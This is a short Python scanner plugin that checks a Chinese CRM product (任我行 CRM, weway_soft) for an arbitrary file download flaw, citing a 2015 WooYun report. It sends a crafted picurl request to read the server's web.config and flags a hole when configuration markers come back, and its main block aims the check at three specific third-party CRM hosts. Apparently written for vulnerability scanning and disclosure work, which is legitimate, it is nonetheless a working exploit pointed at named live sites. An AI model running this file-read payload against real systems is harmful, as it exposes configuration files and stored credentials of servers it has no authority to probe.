#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:404
#Name:任我行crm任意文件下载
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0134737

def assign(service,arg):
    if service=="weway_soft":
        return True,arg 
    

def  audit(arg):
    #任意文件下载
    url=arg+"Common/PictureView1/?picurl=/web.config"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and "<configuration>" in res and '<categorySources>' in res:
        security_hole(url)
    
if __name__=="__main__":
    from dummy import *
    audit(assign('weway_soft','http://crm.itdayang.com/crm/')[1]) 
    audit(assign('weway_soft','http://crm.unimass.com:88/')[1])
    audit(assign('weway_soft','http://crm.itdayang.com/crm/')[1])